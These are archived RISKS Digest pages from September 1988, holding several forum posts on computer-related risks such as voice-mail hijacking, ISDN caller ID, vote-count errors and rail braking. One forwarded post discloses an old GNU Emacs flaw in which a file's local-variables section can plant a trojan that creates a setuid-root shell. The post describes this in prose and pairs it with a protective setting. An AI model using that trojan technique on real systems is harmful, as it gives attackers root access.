  rochester!ritcv!wrc   wrc@cs.rit.edu   wrc%rit@csnet-relay

</PRE>
<HR><H3><A NAME="subj6.2">
Re: "Single keystroke" (<A HREF="/Risks/7.52.html">RISKS-7.52</A>, Matthew P Wiener))
</A>
</H3>
<address>
Paul Dubuc
&lt;<A HREF="mailto:pmd@cbnews.ATT.COM ">
pmd@cbnews.ATT.COM 
</A>&gt;
</address>
<i>
15 Sep 88 12:48:10 GMT
</i><PRE>

Does C Shell have a way to display the command before executing it?  In the
Korn Shell you can type [ESC]/&lt;pattern&gt; to display the last command in your
history that matches &lt;pattern&gt; ([ESC]/r in Matt's example).  If it's the
command you want, you just need to hit [RETURN] to execute it.  If not, you can
type another `/` to keep serching or just edit the command and execute it.  I
have gotten into the habit of not using the blind repeat feature in the shell
unless I'm certain that what will be executed is what I want.
 
Paul Dubuc, AT&amp;T Bell Laboratories, Columbus

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
More computer follies -- how not to design a console
</A>
</H3>
<address>
Seth Gordon 
&lt;<A HREF="mailto:sethg@ATHENA.MIT.EDU">
sethg@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 13:10:50 EDT
</i><PRE>

&lt;To test out new user interfaces, Xerox would videotape novice users
&lt;working with the system.

A friend of mine worked at a computer company where they would take a
novice user, hand them the computer in its box, and videotape them as
they tried to open it, set it up, and start using it.

One poor soul had no problems until he had to put the disk in the disk
drive.  He took out the disk, examined the computer, and with great
confidence put it into a "speed line" that was engraved in the case for
decoration.

: Seth Gordon / MIT Brnch., PO Box 53, Cambridge, MA 02139
: bloom-beacon!athena.mit.edu!sethg / standard disclaimer

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 GNU Emacs &amp; Security (A.Gaynor via Eliot Lear)
</A>
</H3>
<address>
the terminal of Geoff Goodfellow  
&lt;<A HREF="mailto:Geoff@KL.sri.com">
Geoff@KL.sri.com
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 08:32:45 PDT
</i><PRE>

Return-Path: &lt;lear@NET.BIO.NET&gt;
Date: Wed, 14 Sep 1988 11:48:10 PDT
From: Eliot Lear &lt;lear@NET.BIO.NET&gt;
To: hackers_guild@ucbvax.Berkeley.EDU
Usmail: 700 East El Camino Real, Mtn View, California 94040 
Phone: (415) 962-7323 
Subject: [gaynor@aramis.rutgers.edu (Silver) : GNU Emacs &amp; Security ] 

[The following was discovered by one of the Rutgers systems programmers.  It
is similar to the old "vi:" bug in that visiting a file may cause execution
of an arbitrary set of commands including shell escapes...  I am told that
this has not been brought up on hg before.-eliot]

From: gaynor@aramis.rutgers.edu (Silver)
Subject: GNU Emacs &amp; Security

This message is being sent to everyone in group slide.  I've wandered across an
application of a feature of GNU Emacs that may allow sliders to fall victim to
trojan horses arbitrarily stuck in files.  The feature in question is the `file
variables' section of a file.  Upon reading the file, portions of text may be
evaluated, with perhaps profound results.  For example, using this feature I
was able to create a file that copied /bin/sh to my home directory, and chmod
it to run setuid root.  It wasn't hard at all.  With a little effort, I'm sure
I could have made its effects totally transparant.

So, protect yourself by inserting the following at the root level of your
.emacs:

  ;; Protect thine arse from the Trojan file-variables section.
  (setq inhibit-local-variables t)

The pertinent portion of this variable's documentation reads, "Non-nil means
query before obeying a file's local-variables list.".  So, from now on, it's
going to ask you if you want to process the variables if they are present.
Only answer `y' if you trust this file not to put you through a blender.  If
you answer `n', you can always look at the variables somewhere within the last
3000 characters of the end of the file, and, if they appear reasonable, say
`M-x normal-mode' to process them.

Regards, [Ag] gaynor@rutgers.edu

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
complex phones
</A>
</H3>
<address>
Dave Fetrow
&lt;<A HREF="mailto:fetrow@bones.biostat.washington.edu ">
fetrow@bones.biostat.washington.edu 
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 17:05:14 PDT
</i><PRE>

 In <A HREF="/Risks/7.52.html">RISKS-7.52</A>, Mike Linnig lists a thought-out critera for dealing with ANI
(ability to identify a callers' phone number). That's fine but it was (by
necessity) lengthy.

 It is getting bothersome that a phone (which was and should be 
simple to use) is getting a bit complex. An awful lot of functions
are being built into a box with audio-only feedback and 12 keys!
(a trend is to let conventional touch-tone phones do more rather
than adding specialized phones with labelled buttons)

 Any one (or 2 or 3) extra functions seem easy to absorb but it's looking
like we'll be faced with dozens. Worse still: the options are different from
phone to phone.

 The risk is the classic "one more feature" risk but applied to a device
we all use, many times a day.
                                          -dave fetrow-

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
ISDN/ANI - What one switch vendor told me
</A>
</H3>
<address>
achesley@hqafsc-lons.ARPA (achesley@sc)  
&lt;<A HREF="mailto:Allen L. Chesley">
Allen L. Chesley
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 10:43:17 edt
</i><PRE>

     Yesterday I happened to attend a full-day seminar given by one of the
major switch manufacturers.  As I had been reading about the ANI question in
RISKS, I took the occasion to ask some questions.  Although many of the answers
depend on how the local telephone company (telco) implements it, this is what
they told me about ISDN (when it eventually arrives. 

1.  Whether or not a calling phone number is available to the receiver is an
option implemented at the switch.  Except for calls to emergency services,
un-listed phone numbers will, in general, not be forwarded.

2.  As part of the features available, the local telco may offer a "blocking"
command (pre-fix/post-fix/command button) depending on demand and/or the FCC
requirements.  This and many other possible features would probably be at added
cost, but the telcos have not yet figured out how they are going to tariff them
all.

3.  There is an entirely new value-added industry possible under ISDN - remote
directory services.  A call ariving at Company A could have the information in
the "D" channel (which carries the calling phone number) routed to Company B,
which could then provide a "customer profile" back to Company A before they
answer the phone.

     Don't start making plans on cutting out your mother-in law's calls just
yet (or of autoforwarding them to the local massage parlor).  The ISDN folks
did not take extension phones into account when they designed the standards,
and until they do you are not likely to see full ISDN capability in your homes.
In your businesses yes, in your homes no.

     Another point we had questions about, and they could not answer, is what
happens to all of those companies (like banks) who now do some business using
the touch-tone key pad.  Under ISDN, signalling uses the "D" channel, not one
of the voice carrying "B" channels.  Therefore you cannot listen and capture
touch-tones off of the conversation. 
                                                Allen L. Chesley

     NOTE:  This message does not express the offical or unofficial
     opinions of the United States Air Force, the Department of Defense,
     the United States Government, nor probably most of the United
     Nations.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.52.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.54.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-6</DOCNO>
<DOCOLDNO>IA012-000131-B034-126</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.54.html 128.240.150.127 19970217023129 text/html 18870
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:30:00 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 54</TITLE>
<LINK REL="Prev" HREF="/Risks/7.53.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.55.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.53.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.55.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 54</H1>
<H2> Friday 16 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
CerGro voice mail hacked 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Computer error in vote tallying 
</A>
<DD>
<A HREF="#subj2.1">
Andy Frake
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  IEEE approval voting 
</A>
<DD>
<A HREF="#subj3.1">
Don Chiasson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Reminder -- ROM is not necessarily nonalterable 
</A>
<DD>
<A HREF="#subj4.1">
Andrew Klossner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Colwich Junction 
</A>
<DD>
<A HREF="#subj5.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Smoke Inhalation on Amtrak's "Crescent" 
</A>
<DD>
<A HREF="#subj6.1">
Mike Trout
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Computer assigned hotel rooms 
</A>
<DD>
<A HREF="#subj7.1">
Bruce Wampler
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
CerGro voice mail hacked 
</A>
</H3>
<address>
Really_From John Sheneman
&lt;<A HREF="mailto:Peter Neumann <neumann@csl.sri.com> ">
Peter Neumann &lt;neumann@csl.sri.com&gt; 
</A>&gt;
</address>
<i>
Fri, 16 Sep 1988 12:23:47 PDT
</i><PRE>

"Voice mail user[s?] held up by hackers", by Paul Desmond, Staff Writer

LOS ANGELES -- A wholesale grocer here recently fell victim to a small band of
hackers that comandeered the firm's voice-messaging systems and used it to run
prostritution rings and pass information about drugs.
  The message system problems that have plagued Certified Grocers of California
Ltd. (CerGro) highlight a threat to which many unsuspecting users may be
vulnerable.
  Last October, some of CerGro's roughly 300 voice mail users began complaining
that they were unable to access their voice mailboxes because their passwords
had been invalidated.
  Upon investigation, Michael Marks, CerGro's communications supervisor,
discovered that hackers had overcome the security features of the system and
had reprogrammed up to 200 voice mailboxes for their own use.  The hackers were
accesssing the system using a toll-free 800 number CerGro maintained to let
travelling employees call in for messages.
  [The article goes on to indicate the mailboxes were being used for data on
stolen credit card numbers, cocaine prices, and male and female prostitution
rings.  CerGro removed the 800 number, and activity diminished.  However,
someone called to say that unless 10 voice mailboxes were established for their
use, the intruders would cause damage.  The mailboxes were established, but all
subsequent messages were recorded...]

[Source: Network World, 12 September 1988, courtesy of John Sheneman, 
8319 Kostner Ave., Skokie IL 60076]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Computer error in vote tallying
</A>
</H3>
<address>
FRAKE 
&lt;<A HREF="mailto:andy@vax1.acs.udel.edu">
andy@vax1.acs.udel.edu
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 12:03:58 EDT
</i><PRE>

A note was posted regarding a New York Times report of a data entry
error in a Delaware election.  The fact that 2828 was keyed in instead
of 28 is correct; Sam Beard was the recipient of these extra votes and
not S.B. Woo.  S.B. Woo, the current Lieutenant-Governor, now leads
Sam Beard by approximately 80 votes in the democratic primary for
Senator.  S.B. should be declared the official winner sometime
this morning.

Andrew Frake, Academic Computing Support, University of Delaware

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
IEEE approval voting
</A>
</H3>
<address>
Don Chiasson 
&lt;<A HREF="mailto:G.CHIASSON@DREA-XX.ARPA">
G.CHIASSON@DREA-XX.ARPA
</A>&gt;
</address>
<i>
Fri, 16 Sep 88 11:41:36 ADT
</i><PRE>

     A couple of weeks ago, I voted in the annual election for the IEEE
executive.  This election has an interesting new procedure: approval voting.
In this method, you can vote for as many candidates as you wish.  The winning
candidate is the one who receives the most votes.  This offers a number of
fascinating options.  For example, you can can vote for the two best
candidates, or you can vote against someone by voting for everyone else.  I
like this more than the Hobson's choice of a simple yes to one candidate.
     What I would like to ask is: what can go wrong?  For example, someone
could alter ballots by marking additional places which would be difficult to
detect because the number of votes cast does not have to equal the number of
voters.  What else could go wrong?  What robust safeguards could be put in
place?
                                          Don

  [Some of the other problems are noted in the Saltman, Hoffman, Nilsson works
  recently cited, and in the talk by Eva Waskell summarized by Ron Newman -- 
  see <A HREF="/Risks/2.42.html">RISKS-2.42</A> (14 Apr 86), also in ACM Software Engineering Notes vol 11 no 
  3 (July 1986, pp. 14-16).  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Reminder -- ROM is not necessarily nonalterable 
</A>
</H3>
<address>
Andrew Klossner 
&lt;<A HREF="mailto:andrew%frip.gwd.tek.com@RELAY.CS.NET">
andrew%frip.gwd.tek.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Fri, 16 Sep 88 12:15:46 PDT
</i><PRE>
Organization: Tektronix, Wilsonville, Oregon

   Re: Soviet Space Probe (dcf@ALLSPICE.LCS.MIT.EDU) (<A HREF="/Risks/7.52.html">RISKS-7.52</A>)
   Apparently, US craft have a "panic" mode that takes over if
   there is some problem ... are the panic commands in ROM so that
   they can never be overwritten?" 

I can't answer the question, but note that, for software operating in
the occasionally high-radiation environment of space, "being in ROM"
doesn't mean "can't be overwritten."

  -=- Andrew Klossner   (decvax!tektronix!tekecs!andrew)       [UUCP]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Colwich Junction (UK, 1986)
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Wed, 14 Sep 88 05:17:54 EDT
</i><PRE>

A month or two ago, I wrote (<A HREF="/Risks/7.22.html">RISKS-7.22</A>) describing the Colwich Junction
train collision, on which a summary of the official report had appeared in
Modern Railways magazine.  To summarize briefly, the accident was caused by
driver error; a contributing cause was overcomplication of the signal
system; and another contributing cause was poor braking.  (One person--the
other driver--was killed; 32 of about 900 passengers were admitted to
hospital.  Fair, for a 90-100 mph head-on collision.)

Modern Railways and/or I implied that the reason for the poor braking was
that the wheel slide prevention (WSP) system, i.e. anti-lock braking, had
acted.  Several Risks readers said that this must be wrong, because antilock
braking should improve the braking, by keeping the wheel-rail friction
static rather than dynamic.  [That's not actually obviously true, because
the wheel-rail coefficient of friction must be closer to the coefficient of
friction within the brakes in a train than are the corres- ponding values in
a car.  And static friction at one place implies dynamic at the other.  But
it seems probable that WSP should improve braking.]


I have now obtained further information, including the official report (thanks,
Clive Feather!).  But the principal points (no pun intended) remain obscure.

First, I should point out that the WSP systems on British trains are not
actually designed to minimize the stopping distance.  They are installed to
stop wheelslip for two *other* reasons:

  - If a wheel slips during acceleration, it can spin so fast that the
    frictional heat will damage both wheel and rail surfaces.
  - If a wheel locks during braking, it will develop a flat spot,
    requiring its surface to be reground.

The general principle is to compare speeds of different axles, and assume
slipping if they differ by more than some threshold.  This obviously makes
the assumption that slipping wheels will slip unequally, which may not
actually always be true in the case of braking.

According to the official report on a different accident, the typical
coefficient of static (non-slipping) friction between rail and wheel on a
dry day is 0.3, and on a wet day 0.2; 0.1 suffices for normal braking, and
0.05 to prevent overrunning of signals (assuming no driver error).  The last
two figures may vary from one line to another, and thus not be exactly right
for the Colwich Jct. area.  Values worse than 0.05 occur only in conditions
such as heavy falls of leaves, or icing.

The unexplained part is this.  All witnesses agreed on the speed of the
train.  The driver and the other man in the cab agreed on where the brakes
had been put to emergency.  A witness heard a repetitive air sound coming
from several cars, indicating that the WSP was operating and therefore that
the brakes were indeed on hard.  But all witnesses also agreed that the
train decelerated more gently than in emergency braking.  The investigating
officer made a considerable number of tests, and reproduced the actual
stopping distance only by driving the train about 10 mph faster than
everyone said -- and running the test on wet track, when on the day of the
accident it was dry!

The WSP operates independently on every car, so multiple failures tending to
apply "too much protection" are not plausible.  Actually, some of the
surviving WSP units did have faults in that direction, but not enough of
them to explain what happened.

The report's conclusions and recommendations read in part:

#   Suffice it to say that I am satisfied that [the driver], once he
#   realized that he was about to run past Signal CH23 at Danger,
#   made a full emergency application of the brakes and there is no
#   substantial evidence to show whether or not the brakes operated
#   within the normal limits of efficiency.  ...

#   It is impossible to determine to what extent the operation of the
#   wheel slide prevention equipment or any other factor reduced the
#   efficiency of the braking, but there is no doubt that it was
#   reduced to a certain extent.

Notice that this leaves ambiguous whether it was reduced by the WSP or
by something else.  This is the report of an investigator who is stumped!

#   A full emergency application of the brakes is likely to introduce
#   wheel slide, even on dry rails, particularly if adhesion is reduced
#   by any contaminant,

(One might guess that *that's* the answer, but there was no evidence.)

#                       and thus activate the wheel slide prevention
#   equipment where fitted.  Full emergency brake applications ... are
#   made ... almost inevitably only when there is a true emergency.
#   A very small distance may make all the difference ... and thus with
#   the full emergency application of the brakes I believe that all
#   brakes should be fully applied, even if wheel slide does occur
#   and wheel flats are made on the wheels.  I recommend, therefore,
#   that consideration should be given to the fitting of equipment
#   to automatically eliminate the operation of wheel slide prevention
#   equipment in the event of an emergency brake application being made.

In short, the investigating officer, Major P. M. Olver, does not appear to
have considered the matter of static and dynamic friction; or perhaps Olver
is concerned more with the possibility of the WSP acting "by mistake" due to
a problem with it, but does not state this explicitly.  One wishes that in
addition to trying to reproduce the accident, the test runs had included
some with the WSP disabled.  The effect of that on the stopping distance
would have been highly germane to the recommendation of overridable WSP.

By the way, there have been several letters about the accident in Modern
Railways, but all commenting on the (pun coming) signal aspect.  Perhaps
I'll write a letter about this point myself.

Mark Brader

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Smoke Inhalation on Amtrak's "Crescent"
</A>
</H3>
<address>
Mike Trout
&lt;<A HREF="mailto:miket@brspyr1.brs.com ">
miket@brspyr1.brs.com 
</A>&gt;
</address>
<i>
15 Sep 88 17:35:00 GMT
</i><PRE>

Taken without permission from _The_Call_Board_, publication of the Mohawk &amp;
Hudson chapter of the National Railway Historical Society, which in turn took
it from _Callboy_ of the Massachusetts Bay chapter, which in turn took it from
_The_470_ of the Portland chapter:
 
"About 125 children and 30 adults suffered from smoke inhalation after someone
pulled the emergency brake cord on Amtrak's "Crescent" while it was in a tunnel
near Washington Union Station on May 12, sending exhaust fumes spewing into the
cars.  The "Crescent" departed Washington southbound with two engines, 16 cars,
and about 400 passengers and 18 crew aboard.  Five minutes later, as the train
was in the tunnel, an unknown person for unknown reasons pulled the emergency
brake.  The train stopped in the tunnel with its emergency brakes applied, and
the second engine stalled or died.  The train crew, thinking that an air hose
that controls the brake system had parted, walked the train looking for such a
problem.  Finding none, the crew searched the cars and found that the emergency
brake handle in the first car had been pulled.  Unable to release the brakes,
the crew shut down the lead engine.  Trains that leave Washington Union Station
going south immediately enter a 3,900-foot tunnel that roughly goes under the
grassy Mall stretching form the Capitol to the Lincoln Memorial.  Another
Amtrak engine pulled the train back to the station, and buses retrieved the
passengers from the hospitals to take them to hotels for the night."

Would it not be fairly simple to install sensing devices in locomotive
cabs, indicating when an emergency brake handle had been pulled?  If the crew
knew at once the cause of the automatic brake application, they would not have
wasted time looking for broken air hoses.  And why, upon finding the real
cause, was the crew unable to then release the brakes?  Emergency brake systems
have been around for many, many decades.  One would think that they would have
been "perfected" by now.  Comments from railroading experts?
 
Michael Trout     UUCP:brspyr1!miket
BRS Information Technologies, 1200 Rt. 7, Latham, N.Y. 12110  (518) 783-1161

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Computer assigned hotel rooms
</A>
</H3>
<address>
Bruce Wampler
&lt;<A HREF="mailto:wampler@unmvax.unm.edu ">
wampler@unmvax.unm.edu 
</A>&gt;
</address>
<i>
Wed, 14 Sep 88 19:20:26 MDT
</i><PRE>

I have also had the experience of getting occupied hotel rooms mixed up by a
clerk or computer, but which revealed a true software problem in the hotel's
billing system.

My wife and I had just arrived in LA from a 19 hour flight from Fiji, and
missed my connection, so was jet lagged. The clerk gave us the key for room
456, but apparently entered 546 into the machine (as I found out the next
morning.)  456 was unoccupied, so I didn't have any problem at the start.
Unfortunately, about 3 a.m., someone else was assigned to 456 and woke us up.
The dead bolt kept them out, but it sure messed up what little sleep we were
getting.

When we first arrived, we made several long distance calls that we expected to
be billed to the room.  Well, when we tried to pay the next morning, there was
no bill. Since the computer listed 456 as empty (the 3 a.m. person was assigned
another room, we were told), then there was no provision for recording phone
calls. I would have preferred the sleep, but at least we got free phone calls
for the trouble.  However, the hotel lost revenue because the billing software
didn't account for phone calls from empty rooms. I suppose if the staff knew
that, they could take advantage.

Bruce Wampler

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.53.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.55.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-7</DOCNO>
<DOCOLDNO>IA012-000131-B034-141</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.55.html 128.240.150.127 19970217023141 text/html 21298
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:30:11 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 55</TITLE>
<LINK REL="Prev" HREF="/Risks/7.54.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.56.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.54.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.56.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 55</H1>
<H2> Saturday 17 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
The Ethics of Conflict Simulation 
</A>
<DD>
<A HREF="#subj1.1">
Mike Trout
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Social content of video games 
</A>
<DD>
<A HREF="#subj2.1">
Tim Wood
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Credit Doctors 
</A>
<DD>
<A HREF="#subj3.1">
Dave Robbins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Virus in ROM on commodore 64 
</A>
<DD>
<A HREF="#subj4.1">
Jurjen N.E. Bos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Destructive remote controls 
</A>
<DD>
<A HREF="#subj5.1">
Henry Spencer
</A><br>
<A HREF="#subj5.2">
 Jurjen N.E. Bos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Another one-key mishap 
</A>
<DD>
<A HREF="#subj6.1">
Russ Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Call for Papers, Invitational Workshop on Data Integrity 
</A>
<DD>
<A HREF="#subj7.1">
Zella Ruthberg
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
The Ethics of Conflict Simulation (Re: <A HREF="/Risks/7.49.html">RISKS-7.49</A>)
</A>
</H3>
<address>
Mike Trout
&lt;<A HREF="mailto:miket@brspyr1.brs.com ">
miket@brspyr1.brs.com 
</A>&gt;
</address>
<i>
16 Sep 88 16:23:05 GMT
</i><PRE>

In RISKS-FORUM 7.49, Eric Postpischil and Henry Spencer disagree with Ed
Nilges' assertion (in RISKS-FORUM 7.45) that increasing technical abilities of
computer games has corresponded with a decline in social and moral content.
They point out the subtle yet insidious context of chess and _Monopoly_, the
large number of computer games that encourage moral behavior, and the overt
content of standard wargames.

Although many of their points are valid, I must disagree with the basic
contentions of Eric and Henry.  I, too, have noticed the same disturbing trend
aptly noted by Ed.

I have been involved with the design, use, and history of wargames (perhaps
more correctly called "conflict simulations") for nearly 20 years.  Over that
time, I have witnessed a definite change in attitude among those in the field.
In the mid 70s, a major debate erupted over whether the industry leader
should or should not do a proposed project for the Pentagon.  The consensus was
that dealing with the Pentagon would poison the intellectual atmosphere that
had so far kept conflict simulations a model of integrity.  The project was
never done.

Shortly thereafter, the industry leader was destroyed in a hostile takeover
attempt, and surviving companies began the first Pentagon projects.  Today,
most wargaming companies fight for those precious Pentagon dollars, and gaming
has suffered for it.  Many simulations are today designed for the purpose of
developing better ways to slaughter people, rather than as intellectual history
lessons.  Worse, there is a disturbing tendency to design simulations as
vehicles for displaying aggression.  Certainly 20 years of progress has given
us conflict simulations that are technically far more accurate than anything
done in the "Golden Years" of the 60s and 70s, and the use of computers in
simulations has revolutionized the industry.  But with the improvement in
technical accuracy and mechanics has come a change in the purpose of wargames.
Instead of serving primarily as learning tools, they are now approached as
pure profit-making ventures, military aids, or macho exercises.  The "learning
tool" aspect is still there, but it has been subverted by baser instincts.
 
Of course, there is the "fun" aspect of conflict simulations.  Even the most
intellectual simulations invariably contain certain amounts of "fun," and most
of us get a great deal of satisfaction that way.  I would not deny that I
myself have enjoyed watching my Soviet infantry turn a Nazi pillbox into a 
fireball.  Yet when that enjoyment becomes the PRIMARY purpose of the
simulation, something is wrong.  This is one of the more disturbing aspects of
many arcade-type computer games.  It doesn't matter whether you are pushing a
button on a joystick, typing in a line of commands, or moving a cardboard
counter across a map.  What are the functions of the simulation?  I submit that
greed and aggression have no place in the study of a human activity which is
itself intrinsically rooted in greed and aggression.

